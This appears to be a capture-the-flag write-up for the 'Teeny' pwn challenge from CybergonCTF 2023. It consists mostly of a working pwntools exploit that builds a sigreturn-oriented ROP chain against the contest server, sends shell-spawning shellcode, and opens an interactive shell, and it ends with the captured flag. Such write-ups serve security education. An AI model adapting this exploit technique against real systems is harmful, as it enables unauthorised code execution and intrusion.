# Pwn


## Teeny

https://cdn.discordapp.com/attachments/758115188796162088/1142987852574117978/teeny

---

### Solution

```python
from pwn import *
# local
    # elf=context.binary=ELF("./teeny")
    # p=process("./teeny")
context.arch = 'amd64'
context.os = 'linux'

p = remote("cybergon2023.webhop.me", 5004)

flame=SigreturnFrame()
flame.rax=0x0
flame.rdi=0x0
flame.rsi=0x00040017
flame.rdx=0x500
flame.rip=0x00040015
flame.rsp=0x00040100

payload=p64(0)
payload+=p64(0x00040018) # pop rax; ret;
payload+=p64(0xf)
payload+=p64(0x00040015) # syscall
payload+=bytes(flame)

p.sendline(payload)
shellcode=asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```

After we got the shell, use ls and cat the flag file

CybergonCTF{5UD0_R0P_ch41n}